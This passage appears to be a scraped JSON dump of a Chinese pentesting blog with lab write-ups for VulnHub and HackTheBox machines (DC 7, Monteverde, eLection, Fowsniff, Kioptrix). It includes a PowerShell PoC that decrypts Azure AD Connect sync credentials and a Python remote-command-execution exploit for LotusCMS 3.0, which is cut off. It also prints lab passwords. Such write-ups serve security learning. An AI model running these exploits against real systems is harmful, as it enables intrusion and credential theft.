src=\"/vulnhub_img/WEBRESOURCEec78e70ad5fb9066201f86fcb6670d09%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e作者提示要跳出思维，暂时不要考虑爆破：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdd2f715a6719ccd40c398f1c8e8f3d29%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e好好好，我打死也没想到要这样子跳出思维：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEab409d8569bbf0be265dec29e302b3cc%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e去github上搜索这个用户名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE33bc1bb7046a8a01c3a3f49fd9a83492%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e找到数据库配置文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE86d8cd1aaa55eb57dce4b0a56835951b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e由于没开mysql只能先试试ssh:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE03be98d809d2fee2455fe3e35f824801%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e这靶机完全翻车了，提权也很离谱，首先是家目录下面有一个非正常文件，叫mbox，看一下发现计划任务字样：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6f02ef6140f51f973af2b9c13baa45f9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看文件，大致内容为清空文件夹、备份数据库，打包，修改权限，然后删除，看样子，理论上，我是有机会在计划任务执行期间复制website.sql的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEca2b9c1242fcf271a8ced0c5ac391cb0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e理论上行得通，这又何尝不是一种条件竞争呢，写一个shell脚本试试：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#!/bin/bash\r\nfor i in {1..10000}\r\ndo\r\ncp website.sql ../\r\nsleep 1\r\ndone\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE43db16261b1ad56453179eb10c637a2d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e成功了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd7978a4fa5cdc3e0f9f8b595f6ce2070%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e内容太多了，不好看，罢了，我有数据库密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE37df18db587e342de64ce78e622add64%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e算了，搞了半天，数据库连不上，其实想看数据库主要也是想看web后台密码。\u003c/p\u003e\n\u003cp\u003e直接修改sh，是没修改权限的，但是www-data有：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8ea968f9eea505d4490c874a11b9e524%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后想去拿个webshell，直接修改php文件，然后我一看web目录又没权限，再次翻车：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf590a498ceac7ef7236b8a3eabc3e812%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e无奈看wp，修改drupal的密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE31551ab625f010a14b5ea0523d34e834%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后登录后台去修改php代码，添加php模块，url:\u003ca href=\"https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz\"\u003ehttps://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9ab714f997ac369e289c6522fcb98f19%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e开启：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE89cd5def2f6b4dab07b0e8f878cc692e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改代码，保存后自动执行\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEed66d330641168e2fb32801784958155%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x025 DC 7"},{"content":"端口扫描 获取立足点 值得关注的端口：445、389、5985\n445没有：\n389可以列出用户名：\n但是AS-REP Roasting失败：\n那就只能破解试试了：\n发现没有锁定策略：\n经过尝试：\n账户名即使密码：\n发现内容：\n密码喷洒：\n拿到flag:\n提权 bloodhound\n简单解读一下，就是本地提权，或者寻找其他路径：\nwinpeass:\n感觉这个有机会，应为和这个组的权限好像有关系：\n看一下软件安装情况，可以发现这些软件：\n后面的内容属实不会了，无奈看了wp:\n最后修改的poc:\nFunction Get-ADConnectPassword{\rWrite-Host \u0026#34;AD Connect Sync Credential Extract POC (@_xpn_)`n\u0026#34;\r$key_id = 1\r$instance_id = [GUID]\u0026#34;1852B527-DD4F-4ECF-B541-EFCCBFF29E31\u0026#34;\r$entropy = [GUID]\u0026#34;194EC2FC-F186-46CF-B44D-071EB61F49CD\u0026#34;\r$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true\u0026#34;\r$client.Open()\r$cmd = $client.CreateCommand()\r$cmd.CommandText = \u0026#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \u0026#39;AD\u0026#39;\u0026#34;\r$reader = $cmd.ExecuteReader()\r$reader.Read() | Out-Null\r$config = $reader.GetString(0)\r$crypted = $reader.GetString(1)\r$reader.Close()\radd-type -path \u0026#39;C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll\u0026#39;\r$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager\r$km.LoadKeySet($entropy, $instance_id, $key_id)\r$key = $null\r$km.GetActiveCredentialKey([ref]$key)\r$key2 = $null\r$km.GetKey(1, [ref]$key2)\r$decrypted = $null\r$key2.DecryptBase64ToString($crypted, [ref]$decrypted)\r$domain = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-domain\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Domain\u0026#39;; Expression = {$_.node.InnerXML}}\r$username = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-user\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Username\u0026#39;; Expression = {$_.node.InnerXML}}\r$password = select-xml -Content $decrypted -XPath \u0026#34;//attribute\u0026#34; | select @{Name =\u0026#39;Password\u0026#39;; Expression = {$_.node.InnerXML}}\rWrite-Host (\u0026#34;Domain: \u0026#34; + $domain.Domain)\rWrite-Host (\u0026#34;Username: \u0026#34; + $username.Username)\rWrite-Host (\u0026#34;Password: \u0026#34; + $password.Password)\r} ","permalink":"https://yangzhuzai.github.io/posts/htb/0x025-monteverde/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4426b40786740c7305d93ea06e382c93image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE0370475fd82030fafde08a613842492dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE232cda4a25eed1d4e8da0fa0dc53bfb1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得关注的端口：445、389、5985\u003c/p\u003e\n\u003cp\u003e445没有：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7afb4bd7f5c08207390677f10b9e8063image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e389可以列出用户名：\u003c/p\u003e\n\u003cp\u003e但是AS-REP Roasting失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf114d779bca9d8081ca239ac0ad179c9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那就只能破解试试了：\u003c/p\u003e\n\u003cp\u003e发现没有锁定策略：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE49b27ff43cafb6269200e46970c1cdfeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e经过尝试：\u003c/p\u003e\n\u003cp\u003e账户名即使密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE105e0d41c91897f7ce7d0554fd87e44aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe709208fcb6e72c01b8a4d7635afbb5eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现内容：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdc8de8f23b84b70e406352ad856bbb41image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e密码喷洒：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7f024ac9675ca06bcd8eba13e1a56e8eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e拿到flag:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE9ee4435ce06c2160a6922134155a562eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003ebloodhound\u003c/p\u003e\n\u003cp\u003e简单解读一下，就是本地提权，或者寻找其他路径：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe4cf0162cd4e7cf6da9b86703cce2961image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewinpeass:\u003c/p\u003e\n\u003cp\u003e感觉这个有机会，应为和这个组的权限好像有关系：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE65d209b7e589d06fcd76176d689c1a16image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看一下软件安装情况，可以发现这些软件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe30dd0a310c0f7457d77fbae05e3a93dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面的内容属实不会了，无奈看了wp:\u003c/p\u003e\n\u003cp\u003e最后修改的poc:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eFunction Get-ADConnectPassword{\r\nWrite-Host \u0026#34;AD Connect Sync Credential Extract POC (@_xpn_)`n\u0026#34;\r\n$key_id = 1\r\n$instance_id = [GUID]\u0026#34;1852B527-DD4F-4ECF-B541-EFCCBFF29E31\u0026#34;\r\n$entropy = [GUID]\u0026#34;194EC2FC-F186-46CF-B44D-071EB61F49CD\u0026#34;\r\n$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true\u0026#34;\r\n$client.Open()\r\n$cmd = $client.CreateCommand()\r\n$cmd.CommandText = \u0026#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \u0026#39;AD\u0026#39;\u0026#34;\r\n$reader = $cmd.ExecuteReader()\r\n$reader.Read() | Out-Null\r\n$config = $reader.GetString(0)\r\n$crypted = $reader.GetString(1)\r\n$reader.Close()\r\nadd-type -path \u0026#39;C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll\u0026#39;\r\n$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager\r\n$km.LoadKeySet($entropy, $instance_id, $key_id)\r\n$key = $null\r\n$km.GetActiveCredentialKey([ref]$key)\r\n$key2 = $null\r\n$km.GetKey(1, [ref]$key2)\r\n$decrypted = $null\r\n$key2.DecryptBase64ToString($crypted, [ref]$decrypted)\r\n$domain = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-domain\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Domain\u0026#39;; Expression = {$_.node.InnerXML}}\r\n$username = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-user\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Username\u0026#39;; Expression = {$_.node.InnerXML}}\r\n$password = select-xml -Content $decrypted -XPath \u0026#34;//attribute\u0026#34; | select @{Name =\u0026#39;Password\u0026#39;; Expression = {$_.node.InnerXML}}\r\nWrite-Host (\u0026#34;Domain: \u0026#34; + $domain.Domain)\r\nWrite-Host (\u0026#34;Username: \u0026#34; + $username.Username)\r\nWrite-Host (\u0026#34;Password: \u0026#34; + $password.Password)\r\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb5d2e0593c0820d808addcfcde8e712cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X025 monteverde"},{"content":"端口扫描 渗透 东西不多，就那么几个，重点看起来要么在phpmyadmin要么在那个election中：\n翻查了一圈，好像没看到什么明显的漏洞，邪门儿，冷静后再扫一次，打靶就是这样，很多时候是被自己困住的：\n得到账号密码：love: P@$$w0rd@123\n提权 有GCC，考虑一下内核提权：\n没什么好说的，秒了\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x026-election-1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3a7a3707ff0480a0948261e2a5ae96a7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEacc157c8b770af83a7fdfa7b79a19f58%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e东西不多，就那么几个，重点看起来要么在phpmyadmin要么在那个election中：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf71c52abf5b7ef6f0b312fddd9d604e7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e翻查了一圈，好像没看到什么明显的漏洞，邪门儿，冷静后再扫一次，打靶就是这样，很多时候是被自己困住的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9b3ec4f6acd4c92c952745dbdd66fa86%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e得到账号密码：love: P@$$w0rd@123\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2a1d6c9732cb45df21541d41003b1e6e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa7e69367b98b8a5723777b4fb0b5dea0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有GCC，考虑一下内核提权：\u003c/p\u003e\n\u003cp\u003e没什么好说的，秒了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb893305b7ff9173f72f19dff2a2c52b7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x026 eLection 1"},{"content":"要改网络\n端口扫描 web渗透 官网有相关提示，说密码泄露了，twitter账号上可能有线索：\n去twitter上搜相关账号，结果发现相关链接404了：\n只能网上找现成的WP上的图片了，里面说这是POP邮箱服务的账号密码：\n捡回我的AWK命令处理一下数据：\ncat hash | awk -F: \u0026#39;{print$1}\u0026#39; \u0026gt; pop3username 本地跑hash速度还是慢了，我还是建议批量跑：\nhttps://crackstation.net/\n然后爆破，这里有个坑，第一次用的用户名@域名的方式爆破没爆出来，然后把用户名单独提取出来才爆出来\n然后链接方式就比较多了，wp使用的NC，redis其实也可以使用nc，邮件其实还是图形化好一点，kali我用了thunderbird，windows直接使用foxmail就行了：\n使用thunderbird需要点开高级设置：\n得到ssh密码：S1ck3nBluff+secureshell\n根据收件人信息再次爆破：\n提权 常规手动查的差不多，没有发现明显的提权点，然后上脚本查找，发现可疑的执行脚本：\n发现和登录信息一样：\n写反弹shell，重新登录：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x027-fowsniff1-/","summary":"\u003cp\u003e要改网络\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE14a2ee882388d33ff985c0ad8862ce93%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE720c1716364a146d7d7bff5f592fa15f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eweb渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7f7dd3103e49016f81c1e51f23175c3d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e官网有相关提示，说密码泄露了，twitter账号上可能有线索：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0144f3218f1bb2dc1a2ef171cbca8391%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e去twitter上搜相关账号，结果发现相关链接404了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcd12db52b26cb29f60841da70b99f26c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6b9a855ff01705aeca4cb5c61946ad80%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e只能网上找现成的WP上的图片了，里面说这是POP邮箱服务的账号密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa1c3637bed4dc1ed3451996caa2ce43f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e捡回我的AWK命令处理一下数据：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecat hash | awk -F: \u0026#39;{print$1}\u0026#39; \u0026gt; pop3username\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE42995391e967fc9899dde93b8c3edc2a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e本地跑hash速度还是慢了，我还是建议批量跑：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://crackstation.net/\"\u003ehttps://crackstation.net/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd28be300a3b0ce3a10d35e604df52a93%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后爆破，这里有个坑，第一次用的用户名@域名的方式爆破没爆出来，然后把用户名单独提取出来才爆出来\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4cb2e22638e28598253b21cebf345b2b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后链接方式就比较多了，wp使用的NC，redis其实也可以使用nc，邮件其实还是图形化好一点，kali我用了thunderbird，windows直接使用foxmail就行了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE82d101b53c58dec83905d7599d382206%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用thunderbird需要点开高级设置：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8931ab0842845b4b60f2d0d5382e4c94%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e得到ssh密码：S1ck3nBluff+secureshell\u003c/p\u003e\n\u003cp\u003e根据收件人信息再次爆破：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4f0545d0e0fd5f226875388e111d42cc%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e常规手动查的差不多，没有发现明显的提权点，然后上脚本查找，发现可疑的执行脚本：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa12c89750bf80fcd36f4d97499bc847c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd2675bc5e5748d740cf098aefef32f1c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现和登录信息一样：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb3674d9c08407f58df270222ac4747dd%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e写反弹shell，重新登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE02bf985f28fa5b4d635bb9e62121418e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x027 FOWSNIFF1 "},{"content":"端口扫描 渗透 LotusCMS漏洞，利用脚本：\n#!/usr/bin/python\r# Lotus CMS 3.0 eval() Remote Command Execition Exploit\r# flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/\r# Auther Vaibhav Joshi(https://twitter.com/vj0shii)\rimport sys,requests,os\rdef execute(URL):\ros.system(\u0026#34;clear\u0026#34;)\rprint(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\rprint(\u0026#34;\\t| Lotus CMS 3.0 eval() Remote Command Execition |\u0026#34;)\rprint(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\rprint(\u0026#34;\\t| Reference : http://secunia.com/secunia_research/2011-21/ |\u0026#34;)\rprint(\u0026#34;\\t| By : Vaibhav Joshi |\u0026#34;)\rprint(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\rwhile True:\rloginurl = URL+\u0026#34;index.php\u0026#34;\rcommand = raw_input(\u0026#34;# \u0026#34;)\rif command == \u0026#34;exit\u0026#34;:\rprint(\u0026#34;Goodbye!\u0026#34;)\rexit(0)\rpayload = \u0026#34;index\u0026#39;);${system(\u0026#39;\u0026#34;+command+\u0026#34;\u0026#39;)};#\u0026#34;\rr = requests.post(loginurl,headers={\u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;},data={\u0026#39;page\u0026#39;: payload})\rtext = r.text\rt = text.split(\u0026#34;\u0026lt;/html\u0026gt;\u0026#34;)\rprint(t[1])\rdef Verify(URL):\rr = requests.get(URL,allow_redirects=False)\rif r.status_code != 200:\rprint(\u0026#34;Url is not valid\u0026#34;)\rexit(0)\rtry:\rprint(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\rprint(\u0026#34;\\t| Lotus CMS 3.0 eval() Remote Command Execition |\u0026#34;)\rprint(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\rprint(\u0026#34;\\t| Reference : http://secunia.com/secunia_research/2011-21/ |\u0026#34;)\rprint(\u0026#34;\\t| By : Vaibhav Joshi |\u0026#34;)\rprint(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\rif len(sys.argv) \u0026lt; 3:\rprint(\u0026#34;\\t| Usage : %s \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; |\u0026#34; % sys.argv[0])\rprint(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\rsys.exit()\rhost = sys.argv[1]\rport = sys.argv[2]\rloc = raw_input(\u0026#34;Enter Home page URI of CMS (Default /): \u0026#34;)\rif loc == \u0026#34;\u0026#34;:\rloc = \u0026#34;/\u0026#34;\rURL = \u0026#34;http://\u0026#34; + host + \u0026#34;:\u0026#34; + port + loc\rVerify(URL)\rexecute(URL)\rexcept Exception as error:\rprint \u0026#39;Caught this error: \u0026#39; + repr(error) sql注入\n脱裤，发现账号密码：\nssh直接连接报错:\n修复，添加一个配置文件即可：\n重新连接：\n提权 sudo -l\n报错：\n修复一下：\nexport TERM=xterm\n然后就是研究这个东西的用法了，按了半天的键盘，发现主要是靠F数字键进行使用的：\nF3打开文件，编辑文件\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x028-kioptrix-level-1.2/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd82406e1ceb19328fc7b540808c2bbe5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003eLotusCMS漏洞，利用脚本：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#!/usr/bin/python\r\n# Lotus CMS 3.0 eval() Remote Command Execition Exploit\r\n# flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/\r\n# Auther Vaibhav Joshi(https://twitter.com/vj0shii)\r\nimport sys,requests,os\r\n\r\ndef execute(URL):\r\n    os.system(\u0026#34;clear\u0026#34;)\r\n    print(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\r\n    print(\u0026#34;\\t|        Lotus CMS 3.0 eval() Remote Command Execition       |\u0026#34;)\r\n    print(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\r\n    print(\u0026#34;\\t| Reference : http://secunia.com/secunia_research/2011-21/   |\u0026#34;)\r\n    print(\u0026#34;\\t| By        : Vaibhav Joshi                                  |\u0026#34;)\r\n    print(\u0026#34;\\t--------------------------------------------------------------\u0026#34;)\r\n    while True:\r\n        loginurl = URL+\u0026#34;index.php\u0026#34;\r\n        command = raw_input(\u0026#34;# \u0026#34;)\r\n        if command == \u0026#34;exit\u0026#34;:\r\n            print(\u0026#34;Goodbye!\u0026#34;)\r\n            exit(0)\r\n        